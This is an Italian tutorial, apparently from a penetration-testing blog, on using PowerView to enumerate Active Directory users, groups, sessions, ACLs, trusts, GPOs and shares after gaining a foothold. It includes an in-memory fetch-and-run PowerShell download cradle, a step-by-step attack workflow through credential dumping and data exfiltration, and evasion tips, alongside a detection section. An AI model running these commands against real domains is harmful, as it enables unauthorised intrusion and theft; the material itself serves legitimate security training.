---
title: 'PowerView: Enumerazione Active Directory con Comandi ed Esempi'
slug: powerview
description: >-
  Guida a PowerView per enumerare Windows Active Directory: utenti, gruppi,
  computer, ACL, sessioni, GPO e trust con comandi PowerShell ed esempi pratici.
image: /powerview-active-directory.webp
draft: false
date: 2026-07-14T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - PowerView
  - PowerShell
  - ACL
  - trust
---

# PowerView per Active Directory: Comandi e Tecniche di Enumerazione

**In sintesi:** PowerView è uno script PowerShell sviluppato da Will Schroeder (@harmj0y) come parte di PowerSploit. Estende le capacità dei comandi nativi Windows utilizzando query LDAP, classi .NET e API Win32 per enumerare utenti, gruppi, computer, ACL, sessioni, trust e configurazioni di Active Directory, senza richiedere il modulo ActiveDirectory o RSAT.

***

Dopo aver ottenuto un foothold in un dominio, PowerView è quasi sempre il primo script da caricare. Funziona con qualsiasi account di dominio, non richiede privilegi elevati per la maggior parte delle operazioni, e permette di scoprire misconfigurations, path di escalation e target ad alto valore.

> **Key Takeaway:** PowerView rimane uno dei riferimenti storici per l'enumerazione manuale di Active Directory. Il repository PowerSploit è stato archiviato nel gennaio 2021 e non è più supportato — la versione più completa si trova nel branch `dev`, ma ogni comando deve essere verificato in laboratorio sui sistemi moderni.

***

## Caricamento di PowerView

```powershell
# Download e load in memoria — niente file su disco
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')

# Da file locale: dot sourcing (veloce, diretto)
. .\PowerView.ps1

# Verifica caricamento
Get-Command *-Domain* | wc -l  # mostra numero di comandi disponibili
```

***

## Fase 1: Ricognizione del Dominio

Quando accedi a una macchina del dominio, il primo passo è capire in quale dominio sei e chi controlli.

### Chi sei, dove sei

```powershell
# Verifica il tuo contesto corrente
whoami
whoami /upn          # mostra il tuo user principal name (UPN)
```

### Informazioni sul Dominio

Il comando `Get-Domain` raccoglie dettagli sul dominio corrente: nome, SID, forest, domain controller principale, e policy di password.

```powershell
Get-Domain
# Output simile a:
# Name                   : corp.local
# Forest                 : corp.local
# DomainControllers      : {DC01.corp.local}
# DomainSID              : S-1-5-21-1234567890-1234567890-1234567890
# Parent                 : {}
# Children               : {}

# Informazioni più dettagliate
Get-Domain | Select-Object Name, DomainControllers, Forest, DomainSID, ParentDomain
```

**Perché importa:** Il SID del dominio è essenziale per creare un Golden Ticket. Sapere chi è il DC principale aiuta a capire dove inviare le query LDAP.

### Domain SID (Essenziale per Golden Ticket)

```powershell
# Recupera il SID del dominio corrente
Get-DomainSID

# Output: S-1-5-21-1234567890-1234567890-1234567890

# Specifica il dominio se stai in un multi-domain environment
Get-DomainSID -Domain partner.local
```

**Uso:** Quando crafti un Golden Ticket con Mimikatz, serve il domain SID + krbtgt hash.

### Domain Controller e Infrastructure Masters

```powershell
# Lista tutti i DC
Get-DomainController

# Output:
# Name               : DC01.corp.local
# Forest             : corp.local
# HighestCommittedUSN: 20480
```

Questi comandi estrapolano informazioni sui Domain Controller, come la versione del sistema operativo utilizzato e i ruoli FSMO (Schema Master, Domain Naming Master, RID Master, PDC Emulator, Infrastructure Master).

### Policy del Dominio

```powershell
# Password policy, account lockout, Kerberos settings
Get-DomainPolicy

# Accedi direttamente alla password policy
(Get-DomainPolicy)."SystemAccess"
# MinimumPasswordAge       : 0 (giorni prima di poter cambiare)
# MaximumPasswordAge       : 42 (scadenza password)
# MinimumPasswordLength    : 8
# PasswordHistorySize      : 24 (quante password precedenti non ripetere)

# Policy Kerberos
(Get-DomainPolicy)."KerberosPolicy"
# MaxTicketAge             : 600 (minuti, validità ticket)
# MaxClockSkew             : 5 (minuti - tolleranza sincronizzazione clock)
```

**Strategia:** Se MaximumPasswordAge è 42 giorni, le password cambiano frequentemente. Se PasswordHistorySize è basso, puoi testare password vecchie dopo un reset.

### Forest e Multi-Domain Environments

```powershell
# Se sei in un multi-domain forest
Get-Forest | Select-Object Name, RootDomain, Domains, GlobalCatalogs

# Domini nel forest
Get-ForestDomain

# Trust all'interno del forest
Get-ForestTrust
```

***

## Fase 2: Enumerazione Utenti

Una volta capito il dominio, cerchi gli account interessanti: privilegiati, service account, weak accounts.

### Tutti gli Utenti (Base)

```powershell
# Lista TUTTI gli utenti
Get-DomainUser

# Con proprietà specifiche — molto più veloce su domini grandi
Get-DomainUser -Properties SamAccountName, Description, PasswordLastSet, LogonCount

# Esporta su file per analysis offline
Get-DomainUser | Out-File -FilePath ./all-users.txt
Get-DomainUser | Export-Csv -NoTypeInformation users.csv
```

**Problema:** Su domini grandi (1000+ utenti) è lento e verboso. Filtra le proprietà:

```powershell
Get-DomainUser | Select-Object SamAccountName, Description, MemberOf | 
  Where-Object {$_.Description -match "admin|service|sql"}
```

### Utenti con Service Principal Names (Kerberoasting)

Il flag `-SPN` identifica service accounts — utenti con Service Principal Names, che sono target potenziali per Kerberoasting.

```powershell
Get-DomainUser -SPN
```

**Cosa significa:** Se un utente ha un SPN, può essere targetizzato per Kerberoasting — tu puoi richiedere un ticket di servizio e craccare l'hash offline.

```powershell
# Dettagli completi su account Kerberoastable
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName, Description, PasswordLastSet

# Export in CSV per craccare offline
Get-DomainUser -SPN | Select-Object name, samaccountname, serviceprincipalname | Export-CSV kerberoastable.csv
```

### Utenti Vulnerabili a AS-REP Roasting

Il flag `-PreauthNotRequired` trova account vulnerabili a AS-REP Roasting — non hanno Kerberos pre-autenticazione abilitata.

```powershell
Get-DomainUser -PreauthNotRequired

# Se trovi account così:
# Puoi richiedere un ticket Kerberos senza conoscere la password
# Poi craccare l'hash offline con tool come ASREPRoast
```

**Caso d'uso:** Un account di servizio legacy disabilitato ma ancora in AD potrebbe avere pre-auth disabilitata per compatibilità.

### Utenti Privilegiati e Admin Count

```powershell
# Utenti che sono stati in gruppi privilegiati (AdminCount = 1)
Get-DomainUser -AdminCount

# È storico: se un utente era DA anche 1 anno fa, AdminCount rimane 1
# Utili come target per credential dumping
```

### Utenti Attivi vs Inattivi

```powershell
# Utenti mai loggati oppure loggati molto tempo fa
Get-DomainUser -Properties SamAccountName, LastLogonTimestamp, PasswordLastSet, LogonCount | 
  Where-Object {$_.LastLogonTimestamp -lt (Get-Date).AddMonths(-3)}

# LogonCount mostra quante volte un utente si è loggato
# Valore basso = account poco usato / potenzialmente dimenticato
Get-DomainUser | Where-Object {$_.LogonCount -lt 5} | 
  Select-Object SamAccountName, LogonCount, PasswordLastSet
```

**Valore offensivo:** Account inattivi con password vecchie sono buoni candidati per il brute force o il password spray.

### Utenti con Password che Non Scade

```powershell
# Password Never Expires flag (bit 65536)
Get-DomainUser | Where-Object {$_.useraccountcontrol -band 65536} | 
  Select-Object SamAccountName, Description
```

### Traccia i Fallimenti di Login (BadPasswordTime)

```powershell
# BadPasswordTime mostra l'ultimo tentativo fallito di login
# Può indicare account che stanno subendo brute force
Get-DomainUser | Select-Object SamAccountName, BadPasswordTime | 
  Where-Object {$_.BadPasswordTime -gt (Get-Date).AddDays(-1)}
```

***

## Fase 3: Enumerazione Computer e File Server

### Identificare Computer nel Dominio

```powershell
# Tutti i computer
Get-DomainComputer | Select-Object Name, OperatingSystem, DNSHostName | Sort-Object DNSHostName

# Export su file
Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | 
  Sort-Object -Property DnsHostName | Out-File computers.txt
```

### Computer "Live" (Accesi e Raggiungibili)

```powershell
# Quali computer sono online (ping)
Get-DomainComputer -Ping | Select-Object DNSHostName, OperatingSystem

# Solo server
Get-DomainComputer -Ping | Where-Object {$_.OperatingSystem -like "*Server*"} | 
  Select-Object DNSHostName

# Solo workstation
Get-DomainComputer -Ping | Where-Object {$_.OperatingSystem -notlike "*Server*"} | 
  Select-Object DNSHostName
```

### Trovare File Server (Data Exfiltration)

`Get-DomainFileServer` identifica domain file server, che sono prime target per enumeration e compromise perché spesso contengono home directory, script e dati sensibili.

```powershell
Get-DomainFileServer

# Ritorna server di file condivisi — spesso contengono:
# - Home directories
# - Backup
# - Script amministrativi
# - Database
# - Documenti sensibili
```

**Strategia:** Dopo aver compromesso un file server, puoi exfiltrare dati, cercare credenziali in backup, o trovare script con hardcoded password.

### Computer con Unconstrained Delegation (High Value)

```powershell
Get-DomainComputer -Unconstrained

# Questi computer possono impersonare QUALSIASI utente verso QUALSIASI servizio
# Se un DC è loggato su questo computer, puoi estrarre il ticket del DC
# e compromettere l'intero dominio
```

### Computer con Constrained Delegation

```powershell
# Questi possono delegare a servizi specifici
Get-DomainComputer -LDAPFilter '(msds-allowedtodelegateto=*)' `
  -Properties DNSHostName, 'msDS-AllowedToDelegateTo'
```

***

## Fase 4: Sessioni e Utenti Loggati (Privileged User Hunting)

Uno dei modi più diretti per compromettere un admin è trovarli loggati su una workstation, dumpare le loro credenziali, e usarle.

### Dove Sono Loggati gli Utenti Privilegiati

Il modulo `Invoke-UserHunter` (o `Find-DomainUserLocation`) localizza dove specifici utenti sono attualmente loggati, particolarmente utile per trovare Domain Admins attivi.

```powershell
# Trova macchine dove sono loggati i Domain Admin (per default)
Invoke-UserHunter

# Specifico su un utente
Invoke-UserHunter -UserIdentity "amministratore"

# Su un gruppo specifico
Invoke-UserHunter -GroupIdentity "Enterprise Admins"

# Output mostra:
# ComputerName : WORKSTATION01
# UserName     : CORP\administrator
# IP           : 192.168.1.50
```

**Flusso d'attacco:**

1. Esegui `Invoke-UserHunter` per trovare dove un DA è loggato
2. Comprometti quella workstation (RCE, phishing, etc.)
3. Dumpa credenziali (Mimikatz)
4. Usa le credenziali DA per lateral movement o escalation

### Sessioni Locali su una Macchina Specifica

```powershell
# Chi è loggato su una macchina specifica (richiede SMB access)
Get-NetLoggedon -ComputerName WORKSTATION01

# Output:
# UserName : CORP\user1
# LogonTime: 2025-07-11 10:30:00

# Sessioni di rete attive (RPC sessioni, non solamente local logon)
Get-NetSession -ComputerName WORKSTATION01

# Output:
# CName     : \\ATTACKER_IP
# UserName  : attacker
# IDleTime  : 0 (sessione attiva)
```

***

## Fase 5: Gruppi e Membership

### Membri di Gruppi Privilegiati

```powershell
# Chi è nei Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"

# Output:
# MemberName : CORP\administrator
# MemberObjectClass : user
# MemberSID : S-1-5-21-xxx-500

# Ricorsivo (include nested groups — IMPORTANTE!)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Esporta lista completa su file
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | 
  Export-Csv -NoTypeInformation domain-admins.csv
```

### Gruppi Locali su Macchine Specifiche

```powershell
# Administrators locali su una workstation (SMB required)
Get-NetLocalGroupMember -ComputerName WORKSTATION01 -GroupName Administrators

# Enumera TUTTI i gruppi locali
Get-NetLocalGroup -ComputerName WORKSTATION01 | 
  Select-Object GroupName
```

### Dove un Utente è Local Admin

```powershell
# Trova tutte le macchine dove tu sei admin locale (molto rumoroso)
Find-LocalAdminAccess

# Output:
# ComputerName
# WORKSTATION01
# FILESERVER01

# Verifica su una macchina specifica
Test-AdminAccess -ComputerName WORKSTATION01
```

***

## Fase 6: ACL e Permessi Abusabili

### Cercare Permessi Interessanti

```powershell
# Chi ha permessi di modifica su oggetti AD (GenericWrite, GenericAll, etc.)
# che potrebbe non essere un admin
Invoke-ACLScanner -ResolveGUIDs | 
  Where-Object {$_.IdentityReferenceName -notmatch "Domain Admins|SYSTEM|Administrator"} |
  Select-Object ObjectName, IdentityReferenceName, ActiveDirectoryRights
```

`Get-ObjectAcl` recupera la Access Control List di un oggetto, mostrando quali utenti o gruppi hanno permessi e quali azioni possono eseguire.

```powershell
# ACL di un oggetto specifico (es. Domain Admins group)
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
  Select-Object IdentityReferenceName, ActiveDirectoryRights, ObjectName

# Se trovi un utente non-privilegiato con "GenericAll" su un DA,
# puoi resettarne la password e impersonarlo
```

***

## Fase 7: Trust e Multi-Domain Pivoting

Se sei in un environment con multiple domain, i trust sono i bridge per lateral movement.

### Enumerare Trust

```powershell
# Trust del dominio corrente
Get-DomainTrust

# Output:
# SourceName      : corp.local
# TargetName      : partner.local
# TrustType       : TRUST_TYPE_TRANSITIVE (puoi pivotare)
# TrustDirection  : Outbound (corp → partner)
```

### Mapparli Ricorsivamente

```powershell
# Visualizza tutti i trust nel forest in modo ricorsivo
Get-DomainTrust -Recurse

# Alternativa: Get-DomainTrustMapping per un output più dettagliato
Get-DomainTrustMapping

# Output completo con mappatura grafica dei trust
```

### Enumerare Utenti in Domini Trusted

```powershell
# Se corp.local fa trust con partner.local
# Puoi interrogare partner.local

Get-DomainUser -Domain partner.local | Select-Object SamAccountName
Get-DomainGroup -Identity "Enterprise Admins" -Domain corp.local

# Enumera utenti con privilegi nel dominio trusted
Get-DomainUser -Domain partner.local -AdminCount
```

***

## Fase 8: GPO e Misconfiguration

### Trovare GPO che Modificano Gruppi Locali

`Get-DomainGPOLocalGroup` trova tutte le GPO che aggiungono utenti a gruppi locali, utili per identificare chi diventa admin locale.

```powershell
Get-DomainGPOLocalGroup | 
  Select-Object GPODisplayName, GroupName, MemberName

# Se vedi una GPO che aggiunge un account service a "Administrators" locali
# Puoi dumpare la hash di quel service account e usarla
```

### GPO Applicate a un Utente Specifico

```powershell
# Scopri quali GPO si applicano a un utente
Get-DomainGPOUserLocalGroupMapping -UserIdentity targetuser | 
  Select-Object GPODisplayName, GroupName

# Scopri chi ha diritti di modifica sulle GPO
Get-DomainGPO | Select-Object DisplayName, DistinguishedName
```

### Tutti gli Group Policy

```powershell
Get-DomainGPO | Select-Object DisplayName, ModificationTime

# GPO applicate a una macchina specifica
Get-DomainGPO -ComputerIdentity WORKSTATION01 | Select-Object DisplayName
```

***

## Fase 9: Share e Dati Sensibili

### Trovare Share Accessibili

```powershell
Find-DomainShare

# Output:
# Name        : \\FILESERVER01\BackupScripts
# ShareType   : STYPE_DISKTREE
# Comment     : Daily backups
```

### Cercare File Interessanti in Share

```powershell
Find-InterestingDomainShareFile -Include "*.ps1","*.bat","*.config" -ExcludedShares "ADMIN$","IPC$"

# Output: file che contengono credenziali, config script, etc.

# Cerca file specifici
Find-InterestingDomainShareFile -Include "*password*","*credential*"
```

### Enumera Share su una Macchina Specifica

```powershell
Get-NetShare -ComputerName FILESERVER01 | Select-Object Name, Description
```

***

## Workflow Pratico: Da Foothold a Escalation

Ecco un flusso realistico di enumerazione PowerView:

```powershell
# 1. Carica PowerView
. .\PowerView.ps1

# 2. Conosci il dominio e il domain SID (essenziale per Golden Ticket)
$domain = Get-Domain
$domainSID = Get-DomainSID
Write-Output "Dominio: $($domain.Name), SID: $domainSID"

# 3. Trovi gli utenti "interessanti"
$kerberoastable = Get-DomainUser -SPN
$asreproastable = Get-DomainUser -PreauthNotRequired
$admincount = Get-DomainUser -AdminCount
$inactive = Get-DomainUser | Where-Object {$_.LastLogonTimestamp -lt (Get-Date).AddMonths(-6)}

Write-Output "Kerberoastable: $($kerberoastable.Count)"
Write-Output "AS-REP Roastable: $($asreproastable.Count)"
Write-Output "Inactive: $($inactive.Count)"

# 4. Localizzi un Domain Admin loggato (RUMOROSO!)
$logged = Invoke-UserHunter -GroupIdentity "Domain Admins" -Delay 2 -Jitter 0.5
Write-Output "DA loggato su: $($logged.ComputerName)"

# 5. Comprometti quella macchina e dumpi credenziali
# (fuori scope di PowerView, usa Mimikatz/procdump)

# 6. Verifica ACL abusabili
$acl = Invoke-ACLScanner -ResolveGUIDs | 
  Where-Object {$_.IdentityReferenceName -eq $env:USERNAME}

if ($acl) {
    Write-Output "Hai permessi di modifica su: $($acl.ObjectName)"
}

# 7. Esplora trust per pivoting
$trusts = Get-DomainTrust
if ($trusts) {
    Write-Output "Trust trovati verso: $($trusts.TargetName)"
    foreach ($trust in $trusts) {
        Get-DomainUser -Domain $trust.TargetName -AdminCount | 
          Select-Object SamAccountName, Domain
    }
}

# 8. Enumera file server per data exfil
$fileservers = Get-DomainFileServer
foreach ($fs in $fileservers) {
    Find-InterestingDomainShareFile -ComputerName $fs
}
```

***

## OPSEC e Detection

* **Query LDAP:** Meno rumorose di scansioni SMB, ma rilevabili tramite telemetria del DC o logging LDAP (Event 1644)
* **Invoke-UserHunter:** Genera connessioni SMB a ogni macchina del dominio — molto rumoroso su domini grandi. Usa `-Delay` e `-Jitter`
* **Get-NetLoggedon / Get-NetSession:** Accedono alle named pipe `srvsvc` e `wkssvc`
* **Find-LocalAdminAccess:** ESTREMAMENTE rumoroso — contatta ogni macchina. Usa `-Threads 1-3` e `-Delay`

```powershell
# Riduci il rumore
Invoke-UserHunter -GroupIdentity "Domain Admins" -Delay 2 -Jitter 0.5
Find-LocalAdminAccess -Threads 3 -Delay 1
```

***

## Detection

**🔴 HIGH:**

* Event ID 4104 — ScriptBlock PowerView visibile nei log PowerShell
* Event ID 4688 — Processo PowerShell con IEX nella command line
* Burst di query LDAP verso DC
* Connessioni SMB a centinaia di macchine in sequenza (Find-LocalAdminAccess signature)

**🟡 MEDIUM:**

* Named pipe access (`srvsvc`, `wkssvc`) a molte macchine
* Script caricati via IEX da URL remoti
* Moduli PowerShell non riconosciuti (PowerView)

***

## FAQ

**PowerView richiede privilegi admin?**
No. La maggior parte dei comandi (Get-Domain\*, Get-DomainUser, Get-DomainGroup, Get-DomainObjectAcl) funzionano con qualsiasi account autenticato. I comandi che contattano macchine remote (Find-LocalAdminAccess, Get-NetLoggedon) dipendono dai permessi SMB sul target.

**Quali comandi sono più stealth?**
Query LDAP (Get-Domain\*) sono meno rumorose. Comandi come Invoke-UserHunter, Find-LocalAdminAccess, e Find-InterestingDomainShareFile contattano macchine via SMB — generano molto rumore su domini grandi.

**PowerView funziona su PowerShell 7 (Cross-Platform)?**
Sì, ma alcuni comandi potrebbero non funzionare identicamente a causa delle differenze tra .NET Framework e .NET Core. Testa in laboratorio.

**Come esporto i dati per offline analysis?**

```powershell
Get-DomainUser | Export-Csv users.csv
Get-DomainComputer | Export-Csv computers.csv
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | Export-Csv admins.csv
```

**Il repository PowerSploit è ancora mantenuto?**
No. È archiviato dal gennaio 2021. Il codice funziona ancora su ambienti moderni, ma comandi vanno verificati. Cerca fork della community per versioni aggiornate.

***

## Conclusione

PowerView è il punto di partenza per mappare un dominio prima di escalare privilegi o muoversi lateralmente. L'enumerazione sistematica (dominio → utenti → computer → privileged users → trust → acl → gpo → share) rivela misconfigurations, account deboli, e target ad alto valore. Combinata con BloodHound per la visualizzazione grafica e Mimikatz per il credential dumping, PowerView rimane il pilastro dell'AD exploitation.

***

**Risorse:**

* [PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
* [HackTricks – PowerView](https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/powerview.html)
